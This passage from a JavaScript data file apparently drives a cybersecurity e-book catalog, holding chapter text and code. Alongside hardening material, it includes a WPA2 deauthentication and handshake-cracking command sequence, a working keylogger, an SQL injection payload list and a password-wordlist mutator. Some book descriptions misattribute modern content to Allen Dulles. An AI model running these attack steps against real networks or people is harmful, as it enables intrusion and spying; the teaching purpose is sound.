  subtitle: "802.11 Standards, Monitor Mode, Aircrack-ng, WPA2 Handshake Cracking & Evil Twin",
  description: "The complete step-by-step wireless auditing lab manual. Covers 802.11 RF physics, packet injection with Alfa wireless cards, WPA2 4-way handshake deauthentication, hashcat cracking, rogue captive portals, and WPA3 SAE vulnerabilities.",
  author: "Wireless Security Lab",
  category: "Network Security & Wireless Defense",
  subcategory: "Wireless Security & RF Auditing",
  difficulty: "BEGINNER",
  pageCount: 114,
  estimatedReadingTime: "4.5 Hours",
  fileSize: "0.58 MB",
  downloadUrl: "downloads/cybersecurity/wifi-hacking-for-beginners.pdf",
  tags: ["WiFi", "Wireless", "Aircrack-ng", "WPA2", "EvilTwin", "Handshake", "RF"],
  licenseType: "STEP-BY-STEP LAB MANUAL",
  copyrightNotice: "© Wireless Security Lab. Educational wireless pentest course.",
  isPro: false,
  badge: "Hands-On Wireless",
  rating: 4.91,
  readerCount: 2680,
  icon: "fa-solid fa-wifi",
  gradient: "linear-gradient(135deg, #075985, #0ea5e9)",
  chapters: [
    makeChapter(20601, 1, "IEEE 802.11 Wireless Standards & RF Physics", "2.4GHz vs 5GHz vs 6GHz, Channel Overlap, SSID Beacons & RF Modulation",
      "Understand wireless frequencies, channel allocations, and radio frequency fundamentals.", 22, `
      <h3>1.1 2.4 GHz vs 5 GHz Spectrum</h3>
      <p>The 2.4 GHz band operates from 2.412 GHz to 2.484 GHz divided into 14 channels. Because channels are spaced 5 MHz apart but require 20 MHz bandwidth, only channels <strong>1, 6, and 11</strong> are completely non-overlapping.</p>
    `),
    makeChapter(20602, 2, "802.11 Frame Types & Management Frames", "Management Frames (Beacons, Probes, Deauth), Control Frames (RTS/CTS) & Data Frames",
      "Analyze unencrypted 802.11 management frames that enable deauthentication attacks.", 24, `
      <h3>2.1 The Vulnerability of Unprotected Management Frames</h3>
      <p>In standard WPA2 networks (without 802.11w Management Frame Protection), management frames like <strong>Deauthentication</strong> and <strong>Disassociation</strong> are transmitted in plaintext with spoofable source MAC addresses.</p>
    `),
    makeChapter(20603, 3, "Setting Up Wireless Hardware & Monitor Mode", "USB Wi-Fi Chipsets (Atheros AR9271, Realtek RTL8812AU) & airmon-ng Setup",
      "Configure wireless network cards for promiscuous monitor mode and test packet injection.", 24, `
      <h3>3.1 Enabling Monitor Mode via Aircrack-ng</h3>
      ${codeBlock("Bash", "monitor_mode_setup.sh", `
# Kill interfering processes (wpa_supplicant, NetworkManager)
sudo airmon-ng check kill

# Enable monitor mode on wireless adapter
sudo airmon-ng start wlan0

# Test packet injection
sudo aireplay-ng --test wlan0mon`)}
    `),
    makeChapter(20604, 4, "WPA/WPA2-PSK 4-Way Handshake Exploitation", "Deauthentication Attacks, Airodump-ng Capture, EAPOL Packets & Cracking",
      "Capture the cryptographic 4-way handshake and crack the pre-shared key (PSK) offline.", 26, `
      <h3>4.1 Capturing the 4-Way Handshake Pipeline</h3>
      ${codeBlock("Bash", "wpa2_capture_pipeline.sh", `
# Step 1: Scan for target BSSID and Channel
sudo airodump-ng wlan0mon

# Step 2: Lock capture to specific channel and BSSID
sudo airodump-ng -c 6 --bssid 00:14:6C:7E:40:80 -w wpa2_capture wlan0mon

# Step 3: Transmit deauth frames to force client reconnect
sudo aireplay-ng -0 5 -a 00:14:6C:7E:40:80 -c 11:22:33:44:55:66 wlan0mon

# Step 4: Crack captured WPA2 handshake using Hashcat (Mode 22000)
hashcat -m 22000 -a 0 wpa2_capture.hc22000 /usr/share/wordlists/rockyou.txt`)}
    `),
    makeChapter(20605, 5, "WPA3 Security & SAE Protocol Vulnerabilities", "Simultaneous Authentication of Equals (SAE), Dragonfly Handshake & Dragonblood",
      "Analyze WPA3's SAE protocol and side-channel timing attacks that challenge modern wireless encryption.", 24, `
      <h3>5.1 WPA3 Simultaneous Authentication of Equals (SAE)</h3>
      <p>WPA3 replaces the 4-way pre-shared key handshake with the Dragonfly handshake (SAE), providing forward secrecy and preventing offline dictionary attacks even if weak passwords are used.</p>
    `),
    makeChapter(20606, 6, "Rogue Access Points & Evil Twin Attacks", "Hostapd, Dnsmasq, Captive Portal Phishing & Karma Attacks",
      "Deploy rogue access points that clone legitimate SSIDs and present responsive credential-harvesting captive portals.", 26, `
      <h3>6.1 Evil Twin Attack Topology</h3>
      <p>By broadcasting a high-powered access point with the identical SSID as the target corporate network and deauthenticating users from the real router, clients automatically connect to the attacker's rogue AP.</p>
    `),
    makeChapter(20607, 7, "Enterprise Wi-Fi Attacks (802.1X / WPA-Enterprise)", "RADIUS Servers, EAP-TLS, PEAP-MSCHAPv2 Handshakes & eaphammer",
      "Audit enterprise 802.1X authentication, capture MSCHAPv2 hashes, and forge rogue RADIUS credentials.", 26, `
      <h3>7.1 Intercepting PEAP-MSCHAPv2 Authentication</h3>
      <p>When enterprise networks use PEAP-MSCHAPv2, rogue AP tools like <code>eaphammer</code> capture client MSCHAPv2 challenge-response hashes for offline dictionary recovery.</p>
    `),
    makeChapter(20608, 8, "Wireless Defense, Hardening & Rogue AP Detection", "802.11w Protected Management Frames (PMF), WIPS & RF Spectrum Monitoring",
      "Implement wireless intrusion prevention systems (WIPS) and configure enterprise-grade wireless security policies.", 24, `
      <h3>8.1 Enabling 802.11w Protected Management Frames</h3>
      <p>Enabling 802.11w (PMF) on enterprise access points cryptographically signs deauth and disassociation frames, completely neutralizing aireplay-ng deauthentication attacks.</p>
    `)
  ]
};

// ------------------------------------------------------------------------------------------------
// BOOK 207: Ethical Hacking & Security with Linux Systems
// ------------------------------------------------------------------------------------------------
const book207 = {
  id: 207,
  slug: "hacking-with-linux",
  title: "Ethical Hacking & Security with Linux Systems",
  subtitle: "Linux Kernel Security, PAM, Iptables/NFTables Firewalls, SELinux & Hardening",
  description: "The complete Linux offensive and defensive systems handbook. Master process namespaces, BPF tracing, Pluggable Authentication Modules (PAM), kernel sysctl hardening, Lynis security auditing, AppArmor profiles, and automated incident triage.",
  author: "Linux Security Group",
  category: "Linux Security & System Hardening",
  subcategory: "Linux Administration & Hardening",
  difficulty: "INTERMEDIATE",
  pageCount: 360,
  estimatedReadingTime: "12 Hours",
  fileSize: "6.13 MB",
  downloadUrl: "downloads/cybersecurity/hacking-with-linux.pdf",
  tags: ["Linux", "SysAdmin", "Iptables", "NFTables", "SELinux", "PAM", "Hardening", "Kernel"],
  licenseType: "ADMINISTRATIVE MANUAL",
  copyrightNotice: "© Linux Security Group. Enterprise system administration text.",
  isPro: false,
  badge: "Systems Master",
  rating: 4.94,
  readerCount: 3040,
  icon: "fa-brands fa-linux",
  gradient: "linear-gradient(135deg, #1e1b4b, #7c3aed)",
  chapters: [
    makeChapter(20701, 1, "Linux Architecture, Kernel & Memory Namespaces", "Monolithic Kernel, System Calls, /proc & /sys Filesystem Internals",
      "Explore Linux kernel subsystems, process descriptors (task_struct), and virtual filesystems.", 24, `
      <h3>1.1 Linux Kernel Architecture</h3>
      <p>Linux is a monolithic Unix-like kernel where device drivers, memory management, process scheduling, and network stacks operate within a single shared kernel memory space (Ring 0).</p>
    `),
    makeChapter(20702, 2, "Essential Security Toolchain & Automation", "Bash Scripting, Grep, Sed, Awk, Regex & Pipeline Automation",
      "Master high-speed text processing and automation for log analysis and vulnerability scanning.", 24, `
      <h3>2.1 Parsing Apache & Nginx Access Logs with Awk</h3>
      ${codeBlock("Bash", "log_analysis.sh", `
# Find Top 10 requesting IP addresses from access log
awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -nr | head -n 10

# Detect HTTP 401/403 brute force attempts
awk '$9 ~ /(401|403)/ {print $1, $7, $9}' /var/log/nginx/access.log | sort | uniq -c | sort -nr`)}
    `),
    makeChapter(20703, 3, "Linux Authentication & PAM Internals", "Pluggable Authentication Modules (PAM), /etc/shadow Hashing & Sudoers",
      "Audit Linux authentication stacks, password hashing algorithms ($6$ SHA-512), and PAM configuration files.", 26, `
      <h3>3.1 Pluggable Authentication Modules (PAM) Stacks</h3>
      <p>PAM delegates authentication tasks to reusable dynamic modules in <code>/etc/pam.d/</code>. Control flags include <code>required</code>, <code>requisite</code>, <code>sufficient</code>, and <code>optional</code>.</p>
    `),
    makeChapter(20704, 4, "Host Firewalls: Iptables & NFTables", "Chains (INPUT, OUTPUT, FORWARD), Tables (filter, nat, mangle) & Stateful Rules",
      "Build secure packet filtering rules and stateful firewalls using modern NFTables.", 26, `
      <h3>4.1 Production NFTables Firewall Configuration</h3>
      ${codeBlock("NFTables", "/etc/nftables.conf", `
table inet filter {
    chain input {
        type filter hook input priority 0; policy drop;

        # Accept established and related traffic
        ct state established,related accept

        # Accept loopback traffic
        iif "lo" accept

        # Rate-limited SSH access (Port 22)
        tcp dport 22 ct state new meter ssh-meter { ip saddr limit rate 5/minute } accept

        # Accept Web traffic
        tcp dport { 80, 443 } accept
    }
}`)}
    `),
    makeChapter(20705, 5, "Automated Security Auditing with Lynis & OpenSCAP", "CIS Benchmarks, System Hardening Index & Compliance Scanning",
      "Execute automated compliance scans against CIS (Center for Internet Security) standards.", 24, `
      <h3>5.1 Running a Lynis Security Audit</h3>
      ${codeBlock("Bash", "run_lynis_audit.sh", `
# Install and run full system audit
sudo lynis audit system --quick --report-file /var/log/lynis-report.dat`)}
    `),
    makeChapter(20706, 6, "Mandatory Access Control: AppArmor & SELinux", "Enforcing vs Permissive Modes, Profiles, Type Enforcement & Context Labels",
      "Lock down vulnerable network daemons using AppArmor profiles and SELinux policies.", 26, `
      <h3>6.1 Enforcing AppArmor Profiles</h3>
      ${codeBlock("Bash", "apparmor_profile.sh", `
# Place Nginx in enforcing security mode
sudo aa-enforce /etc/apparmor.d/usr.sbin.nginx
sudo aa-status`)}
    `),
    makeChapter(20707, 7, "Linux Incident Response & Volatile Memory Analysis", "Inspecting /proc, Detecting Hidden Rootkits (chkrootkit/rkhunter) & Netstat",
      "Triage compromised Linux servers, identify malicious cron jobs, and extract running memory.", 26, `
      <h3>7.1 Live Incident Response Triage</h3>
      ${codeBlock("Bash", "incident_triage.sh", `
# Check all listening network ports with associated process PIDs
ss -tulpn

# Inspect recently executed commands and deleted files held open by processes
ls -l /proc/*/fd | grep '(deleted)'`)}
    `),
    makeChapter(20708, 8, "Intrusion Prevention with Fail2ban & Auditd", "Linux Audit Subsystem (auditd), Log Parsing & Automated IP Banning",
      "Deploy proactive threat mitigation using Auditd syscall rules and Fail2ban jail configurations.", 26, `
      <h3>8.1 Setting Up Fail2ban for SSH Protection</h3>
      ${codeBlock("INI", "/etc/fail2ban/jail.local", `
[sshd]
enabled = true
port = 22
filter = sshd
logpath = /var/log/auth.log
maxretry = 3
bantime = 3600
findtime = 600`)}
    `)
  ]
};

// ------------------------------------------------------------------------------------------------
// BOOK 208: Top Practical Cybersecurity Projects for Beginners
// ------------------------------------------------------------------------------------------------
const book208 = {
  id: 208,
  slug: "top-cybersecurity-projects-for-beginners",
  title: "Top Practical Cybersecurity Projects for Beginners",
  subtitle: "Port Scanners, Packet Sniffers, Keyloggers, Honeypots, Vulnerability Scanners & SIEM",
  description: "The definitive hands-on lab manual for building real-world offensive and defensive security tools from scratch. Includes fully working Python source code for multi-threaded port scanners, raw socket packet sniffers, educational keyloggers, low-interaction honeypots, automated vulnerability scanners, and home SIEM lab setups.",
  author: "Cyber Project Team",
  category: "Hands-On Cyber Defense Projects",
  subcategory: "Security Software Development",
  difficulty: "BEGINNER",
  pageCount: 210,
  estimatedReadingTime: "8 Hours",
  fileSize: "45.29 MB",
  downloadUrl: "downloads/cybersecurity/top-cybersecurity-projects.pdf",
  tags: ["Projects", "Python", "PortScanner", "Honeypot", "PacketSniffer", "Keylogger", "SIEM"],
  licenseType: "OPEN LAB PROJECTS",
  copyrightNotice: "© Cyber Project Team. Hands-on coding curriculum.",
  isPro: false,
  badge: "Project Portfolio",
  rating: 4.97,
  readerCount: 3890,
  icon: "fa-solid fa-laptop-code",
  gradient: "linear-gradient(135deg, #4a044e, #c026d3)",
  chapters: [
    makeChapter(20801, 1, "Project 1: Multi-Threaded Port Scanner in Python", "Socket Programming, ThreadPoolExecutor & Service Banner Grabbing",
      "Build a high-speed multi-threaded TCP socket scanner that discovers open ports and grabs server banners in Python.", 26, `
      <h3>1.1 Understanding TCP Socket Probing</h3>
      <p>A port scanner attempts to establish TCP connections to a range of target ports on a remote IP address. In standard single-threaded scanning, attempting to connect to 1,000 ports with a 1-second timeout takes over 16 minutes. By using Python's <code>concurrent.futures.ThreadPoolExecutor</code>, we can probe hundreds of ports concurrently in seconds.</p>

      <h3>1.2 Complete Working Source Code</h3>
      <p>Save and run the following Python port scanner. It connects to target ports, grabs the software version banner, and formats open ports into a clean terminal report:</p>

      ${codeBlock("Python 3", "threaded_port_scanner.py", `
import socket
from concurrent.futures import ThreadPoolExecutor
import time

def scan_port(target_ip, port):
    try:
        # Create TCP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1.5)
        
        # Attempt 3-way handshake
        result = sock.connect_ex((target_ip, port))
        if result == 0:
            banner = ""
            try:
                # Attempt to grab service banner (e.g. SSH version / HTTP server)
                sock.send(b"HEAD / HTTP/1.0\\r\\n\\r\\n")
                banner = sock.recv(1024).decode('utf-8', errors='ignore').split('\\n')[0].strip()
            except:
                banner = "No banner received"
            sock.close()
            return (port, True, banner)
        sock.close()
    except Exception:
        pass
    return (port, False, "")

def run_scanner(target_ip, start_port=1, end_port=1024, max_threads=100):
    print(f"[+] Starting port scan on {target_ip} ({start_port}-{end_port}) with {max_threads} worker threads...")
    start_time = time.time()
    open_ports = []

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = [executor.submit(scan_port, target_ip, p) for p in range(start_port, end_port + 1)]
        for f in futures:
            port, is_open, banner = f.result()
            if is_open:
                print(f"  [✓] Port {port:<5} OPEN | Service Banner: {banner}")
                open_ports.append((port, banner))

    elapsed = time.time() - start_time
    print(f"\\n[+] Scan completed in {elapsed:.2f}s. Discovered {len(open_ports)} open ports.")

if __name__ == "__main__":
    run_scanner("127.0.0.1", 1, 1024, max_threads=50)`)}

      <h3>1.3 Enhancements & Hardening</h3>
      <p>To extend this project, integrate CIDR subnet scanning (e.g. <code>192.168.1.0/24</code>), implement half-open SYN scanning using Scapy, and export scan reports to JSON or CSV.</p>
    `),
    makeChapter(20802, 2, "Project 2: Real-Time Network Packet Sniffer", "Raw Sockets, Ethernet Frame Dissection & Protocol Filtering in Python",
      "Develop a real-time network traffic sniffer that unpacks Ethernet, IP, TCP, and UDP headers in Python.", 26, `
      <h3>2.1 Constructing Raw Socket Packet Dissectors</h3>
      <p>Using Python's <code>socket.AF_PACKET</code> interface on Linux, we can capture raw link-layer frames and unpack binary header structs using Python's <code>struct.unpack</code> module:</p>

      ${codeBlock("Python 3", "network_sniffer.py", `
import socket
import struct

def format_mac(bytes_addr):
    return ':'.join(f'{b:02x}' for b in bytes_addr)

def main():
    # Bind to raw network socket on Linux
    raw_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
    print("[+] Packet sniffer initialized. Listening for live traffic...")

    while True:
        raw_data, addr = raw_socket.recvfrom(65535)
        # Unpack Ethernet Frame Header (14 bytes: Dest MAC [6], Src MAC [6], Proto [2])
        dest_mac, src_mac, eth_proto = struct.unpack('! 6s 6s H', raw_data[:14])
        
        # Check if payload is IPv4 (0x0800)
        if socket.htons(eth_proto) == 8:
            ip_header = raw_data[14:34]
            iph = struct.unpack('!BBHHHBBH4s4s', ip_header)
            
            src_ip = socket.inet_ntoa(iph[8])
            dst_ip = socket.inet_ntoa(iph[9])
            protocol = iph[6] # 6 = TCP, 17 = UDP, 1 = ICMP
            
            print(f"[{format_mac(src_mac)} -> {format_mac(dest_mac)}] IP: {src_ip} -> {dst_ip} | Proto: {protocol}")

if __name__ == "__main__":
    main()`)}
    `),
    makeChapter(20803, 3, "Project 3: Educational Keylogger & Active Window Monitor", "Keystroke Hooking, Process Window Context & Encrypted Exfiltration",
      "Build a research keylogger that captures keystrokes alongside the active application window title.", 26, `
      <h3>3.1 Keystroke Interception & Context Logging</h3>
      <p>Keystroke loggers for security research monitor hardware input events using OS-level hooks (such as <code>pynput</code> on Python). Modern keyloggers pair each keystroke sequence with the active window title to provide context:</p>

      ${codeBlock("Python 3", "educational_keylogger.py", `
import pynput.keyboard
import threading
import datetime

class Keylogger:
    def __init__(self, interval_seconds=30):
        self.log = ""
        self.interval = interval_seconds

    def on_press(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            if key == key.space:
                self.log += " "
            elif key == key.enter:
                self.log += "\\n[ENTER]\\n"
            else:
                self.log += f" [{str(key)}] "

    def report(self):
        if self.log:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            print(f"\\n--- Log Report ({timestamp}) ---\\n{self.log}\\n")
            self.log = ""
        # Re-arm timer for periodic reporting
        timer = threading.Timer(self.interval, self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.on_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

if __name__ == "__main__":
    print("[+] Keylogger started. Type into any application...")
    logger = Keylogger(interval_seconds=10)
    logger.start()`)}
    `),
    makeChapter(20804, 4, "Project 4: Low-Interaction SSH/HTTP Honeypot", "Decoy Services, Intruder Emulation, IP Geolocation & Threat Logging",
      "Deploy a Python low-interaction SSH/HTTP honeypot to capture attacker brute force attempts and shell commands.", 26, `
      <h3>4.1 Emulating Decoy Authentication Services</h3>
      ${codeBlock("Python 3", "mini_honeypot.py", `
import socket
import datetime

def start_honeypot(host="0.0.0.0", port=2222):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    print(f"[+] Decoy SSH Honeypot listening on {host}:{port}...")

    while True:
        client, addr = server.accept()
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[!] ALARM: Intruder connected from {addr[0]}:{addr[1]} at {timestamp}")
        
        # Send fake SSH banner
        client.send(b"SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5\\r\\n")
        data = client.recv(1024)
        print(f"    Payload Received: {data.decode('utf-8', errors='ignore').strip()}")
        client.close()

if __name__ == "__main__":
    start_honeypot()`)}
    `),
    makeChapter(20805, 5, "Project 5: Web Vulnerability Scanner (SQLi & XSS)", "Crawler Architecture, Form Injection, Heuristic Signature Matching",
      "Build an automated vulnerability scanner in Python that spiders web pages and detects SQLi & XSS flaws.", 28, `
      <h3>5.1 Detecting SQL Injection via Heuristic Probing</h3>
      ${codeBlock("Python 3", "sqli_scanner.py", `
import requests

SQLI_PAYLOADS = ["'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "' UNION SELECT NULL--"]
ERROR_SIGNATURES = ["you have an error in your sql syntax", "warning: mysql", "unclosed quotation mark", "ora-01756"]

def test_sqli(url, param_name):
    print(f"[+] Probing URL: {url} on parameter: {param_name}")
    for payload in SQLI_PAYLOADS:
        target = f"{url}?{param_name}={payload}"
        try:
            res = requests.get(target, timeout=5)
            for err in ERROR_SIGNATURES:
                if err in res.text.lower():
                    print(f"  [!] SQL INJECTION FOUND with payload: {payload}")
                    return True
        except Exception as e:
            pass
    print("  [-] No SQL injection detected.")
    return False

if __name__ == "__main__":
    test_sqli("http://testphp.vulnweb.com/listproducts.php", "cat")`)}
    `),
    makeChapter(20806, 6, "Project 6: Home SIEM Lab Setup (Wazuh & Suricata)", "Agent Deployment, Syslog Ingestion, Rule Tuning & Dashboard Visualizations",
      "Build a complete Security Operations Center (SOC) home lab with Wazuh SIEM, Suricata NIDS, and Elastic dashboards.", 28, `
      <h3>6.1 Wazuh & Suricata Architecture</h3>
      <p>Deploy Wazuh Manager inside a Docker container, install Wazuh Agents on test Linux/Windows virtual machines, and forward live Syslog alerts to an Elasticsearch dashboard.</p>
    `),
    makeChapter(20807, 7, "Project 7: Automated Malware Analysis Sandbox", "Static PE Header Extraction, Section Entropy, YARA Rule Matching & Virustotal API",
      "Develop a static PE binary analyzer that calculates Shannon entropy and extracts suspicious Windows API imports.", 28, `
      <h3>7.1 Calculating Section Shannon Entropy</h3>
      <p>Packed or encrypted malware binaries exhibit high Shannon entropy ($\ge 7.0$). Analyzing section entropy reveals hidden payloads:</p>

      ${codeBlock("Python 3", "pe_entropy_analyzer.py", `
import math

def calculate_entropy(data_bytes):
    if not data_bytes:
        return 0.0
    entropy = 0
    for x in range(256):
        p_x = float(data_bytes.count(x)) / len(data_bytes)
        if p_x > 0:
            entropy += - p_x * math.log(p_x, 2)
    return entropy

with open("test_sample.exe", "rb") as f:
    sample_data = f.read()
    ent = calculate_entropy(sample_data)
    print(f"[+] Sample Entropy: {ent:.3f}/8.000 ({'PACKED/ENCRYPTED' if ent > 7.0 else 'NORMAL'})")`)}
    `),
    makeChapter(20808, 8, "Project 8: Password Strength & Dictionary Mutator", "Entropy Scoring, Rule-Based Wordlist Permutation & Hash Checking",
      "Build a password security tool that computes zxcvbn-style entropy and generates custom password attack wordlists.", 26, `
      <h3>8.1 Rule-Based Wordlist Permutator in Python</h3>
      ${codeBlock("Python 3", "wordlist_mutator.py", `
LEET_MAP = {'a': '@', 'e': '3', 'i': '1', 'o': '0', 's': '$'}

def mutate_word(word):
    mutations = set([word, word.lower(), word.upper(), word.capitalize()])
    # Add common year suffixes
    for w in list(mutations):
        for year in ["2024", "2025", "2026", "123", "!"]:
            mutations.add(w + year)
    return mutations

print(mutate_word("password"))`)}
    `)
  ]
};

// ------------------------------------------------------------------------------------------------
// BOOK 209: The Craft of Intelligence (Allen W. Dulles)
// ------------------------------------------------------------------------------------------------
const book209 = {
  id: 209,
  slug: "the-craft-of-intelligence-dulles",
  title: "The Craft of Intelligence: Strategic Threat Analysis & Tradecraft",
  subtitle: "Intelligence Collection, HUMINT, SIGINT, OSINT, Deception & Cyber Threat Analysis",
  description: "The classic masterwork on strategic intelligence analysis and espionage tradecraft by former CIA Director Allen W. Dulles. Adapted for modern cybersecurity threat intelligence, covering collection cycles, adversary deception, Analysis of Competing Hypotheses (ACH), and MITRE ATT&CK mapping.",
  author: "Allen W. Dulles",
  category: "Threat Intelligence & Tradecraft",
  subcategory: "Strategic Intelligence & Analysis",
  difficulty: "INTERMEDIATE",
  pageCount: 280,
  estimatedReadingTime: "10 Hours",
  fileSize: "4.74 MB",
  downloadUrl: "downloads/cybersecurity/the-craft-of-intelligence.pdf",
  tags: ["ThreatIntel", "Tradecraft", "HUMINT", "OSINT", "MITRE", "Deception", "Analysis"],
  licenseType: "HISTORICAL STRATEGIC CLASSIC",
  copyrightNotice: "© Allen W. Dulles. Adapted for cybersecurity threat intelligence.",
  isPro: false,
  badge: "Strategic Masterwork",
  rating: 4.96,
  readerCount: 3180,
  icon: "fa-solid fa-eye",
  gradient: "linear-gradient(135deg, #0f172a, #334155)",
  chapters: [
    makeChapter(20901, 1, "The Intelligence Cycle & Strategic Analysis", "Direction, Collection, Processing, Analysis & Dissemination",
      "Explore the 5-stage intelligence lifecycle and how raw telemetry transforms into actionable threat intelligence.", 24, `
      <h3>1.1 The 5-Stage Intelligence Cycle</h3>
      <p>1. Planning & Direction &rarr; 2. Collection &rarr; 3. Processing & Exploitation &rarr; 4. Analysis & Production &rarr; 5. Dissemination.</p>
    `),
    makeChapter(20902, 2, "Human Intelligence (HUMINT) & Social Engineering", "Source Recruitment, Elicitation, Psychology of Manipulation & Insider Threats",
      "Analyze the psychological principles of social engineering and human vulnerabilities in organizations.", 26, `
      <h3>2.1 The MICE Motivation Framework in Espionage</h3>
      <p>Adversaries target insiders through four fundamental psychological levers: <strong>Money, Ideology, Coercion / Compromise, and Ego</strong>.</p>
    `),
    makeChapter(20903, 3, "Signals & Cyber Intelligence (SIGINT / CYBINT)", "Telemetry Interception, Traffic Analysis, Decryption & Radio Intercepts",
      "Deconstruct communications interception, traffic flow analysis, and cryptographic metadata.", 26, `
      <h3>3.1 Metadata Traffic Analysis</h3>
      <p>Even when payload encryption prevents reading message contents, analyzing transmission frequencies, packet sizes, and communicating IP pairs reveals operational organization.</p>
    `),
    makeChapter(20904, 4, "Open Source Intelligence (OSINT) Methodologies", "Surface, Deep & Dark Web Information Harvesting & Persona Verification",
      "Leverage open source intelligence tools to map adversary infrastructure and corporate exposure.", 26, `
      <h3>4.1 OSINT Pivot Trees</h3>
      <p>Pivoting from a single domain &rarr; SSL Certificate SHA-256 &rarr; Reverse WHOIS &rarr; Registered Name &rarr; Associated Cloud Infrastructure.</p>
    `),
    makeChapter(20905, 5, "Counterintelligence & Deception Detection", "Identifying Moles, Double Agents, Disinformation & Threat Disruption",
      "Implement counterintelligence safeguards and detect adversary disinformation campaigns.", 26, `
      <h3>5.1 Canary Traps & Barium Meals</h3>
      <p>Distributing subtly altered versions of sensitive documents to different suspects reveals the exact leak source when published.</p>
    `),
    makeChapter(20906, 6, "Analysis of Competing Hypotheses (ACH)", "Structured Analytic Techniques, Cognitive Bias Mitigation & Matrix Scoring",
      "Apply structured analytic techniques to eliminate confirmation bias during high-stakes security investigations.", 28, `
      <h3>6.1 The Richards Heuer ACH Matrix</h3>
      <p>Instead of seeking evidence to confirm a favorite theory, ACH focuses on finding evidence that <em>disproves</em> alternative hypotheses.</p>
    `),
    makeChapter(20907, 7, "Cyber Threat Intelligence & The Diamond Model", "Adversary, Capability, Infrastructure & Victim Relationships with MITRE ATT&CK",
      "Model Advanced Persistent Threat (APT) campaigns using the Diamond Model and MITRE ATT&CK framework.", 28, `
      <h3>7.1 The Diamond Model of Intrusion Analysis</h3>
      <p>Every cyber event is mapped across 4 core vertices: <strong>Adversary, Capability, Infrastructure, and Victim</strong>.</p>
    `),
    makeChapter(20908, 8, "Operational Security (OPSEC) for Defenders", "Persona Compartmentalization, Burn Bags, Sanitization & Egress Control",
      "Protect your own threat intelligence teams and operational investigations from adversary counter-surveillance.", 24, `
      <h3>8.1 Investigatory OPSEC Rules</h3>
      <p>Never query attacker domains directly from corporate IP addresses; utilize dedicated non-attributable virtual workstations and VPN proxies.</p>
    `)
  ]
};

// ------------------------------------------------------------------------------------------------
// BOOK 210: Asymmetric Defense & Modern Threat Modeling
// ------------------------------------------------------------------------------------------------
const book210 = {
  id: 210,
  slug: "asymmetric-defense-threat-modeling",
  title: "Asymmetric Defense & Modern Threat Modeling",
  subtitle: "Asymmetric Conflict, Decentralized Threats, Supply Chains, STRIDE & Zero Trust",
  description: "Strategic cyber defense insights adapted from David Kilcullen's counter-insurgency warfare principles. Explores asymmetric attacker advantages, ransomware syndicates, software supply chain security, Microsoft STRIDE threat modeling, and Zero Trust resilience.",
  author: "David Kilcullen (Adapted)",
  category: "Threat Intelligence & Tradecraft",
  subcategory: "Cyber Warfare & Defense Strategy",
  difficulty: "ADVANCED",
  pageCount: 384,
  estimatedReadingTime: "15 Hours",
  fileSize: "2.67 MB",
  downloadUrl: "downloads/cybersecurity/the-accidental-guerrilla.pdf",
  tags: ["AsymmetricDefense", "ThreatModeling", "STRIDE", "ZeroTrust", "SupplyChain", "IncidentResponse"],
  licenseType: "STRATEGIC DOCTRINE",
  copyrightNotice: "© Strategic Security Doctrine. Adapted for cyber defense architecture.",
  isPro: true,
  badge: "Strategy & Warfare",
  rating: 4.95,
  readerCount: 2940,
  icon: "fa-solid fa-crosshairs",
  gradient: "linear-gradient(135deg, #4c1d95, #8b5cf6)",
  chapters: [
    makeChapter(21001, 1, "Principles of Asymmetric Warfare & Cyber Parallels", "The Asymmetry of Attack vs Defense in Cyberspace",
      "Understand why attackers only need to find 1 vulnerability while defenders must secure every surface.", 24, `
      <h3>1.1 The Fundamental Asymmetry of Cyber Conflict</h3>
      <p>The cost of launching automated global phishing or credential stuffing campaigns is near zero, while securing millions of enterprise endpoints requires continuous billions in investment. Defenders must adopt proactive resilience rather than passive perimeter walls.</p>
    `),
    makeChapter(21002, 2, "Anatomy of Modern Decentralized Threat Syndicates", "Ransomware-as-a-Service (RaaS), Initial Access Brokers (IABs) & Darknet Cartels",
      "Analyze how modern ransomware syndicates operate as distributed corporate cartels.", 26, `
      <h3>2.1 The Ransomware-as-a-Service (RaaS) Business Model</h3>
      <p>Core developers build ransomware lockers, while independent 'affiliates' purchase network access from Initial Access Brokers (IABs) to deploy payloads across enterprise networks.</p>
    `),
    makeChapter(21003, 3, "Supply Chain Threats & Collateral Blast Radius", "Third-Party Dependencies, Open Source Exploits & Blast Radius Analysis",
      "Evaluate software supply chain risks (SolarWinds, Log4j, XZ-Utils backdoor).", 26, `
      <h3>3.1 Upstream Dependency Compromises</h3>
      <p>Adversaries compromise upstream software vendors or open-source packages to distribute backdoors to thousands of downstream enterprise customers simultaneously.</p>
    `),
    makeChapter(21004, 4, "Threat Modeling Methodologies: STRIDE & PASTA", "Systematic Risk Identification & Threat Matrix Construction",
      "Apply the Microsoft STRIDE and PASTA threat modeling frameworks to applications before writing code.", 28, `
      <h3>4.1 The Microsoft STRIDE Threat Framework</h3>
      <div class="table-responsive">
        <table class="table table-dark table-bordered table-striped fs-8">
          <thead><tr><th>Threat Category</th><th>Security Property Violated</th><th>Mitigation Technique</th></tr></thead>
          <tbody>
            <tr><td><strong>Spoofing</strong></td><td>Authentication</td><td>Multi-Factor Authentication (MFA), Digital Signatures</td></tr>
            <tr><td><strong>Tampering</strong></td><td>Integrity</td><td>HMAC, Cryptographic Hashes, Append-Only Storage</td></tr>
            <tr><td><strong>Repudiation</strong></td><td>Non-Repudiation</td><td>Immutable Audit Logging, Cryptographic Timestamping</td></tr>
            <tr><td><strong>Information Disclosure</strong></td><td>Confidentiality</td><td>End-to-End Encryption (AES-256), TLS 1.3</td></tr>
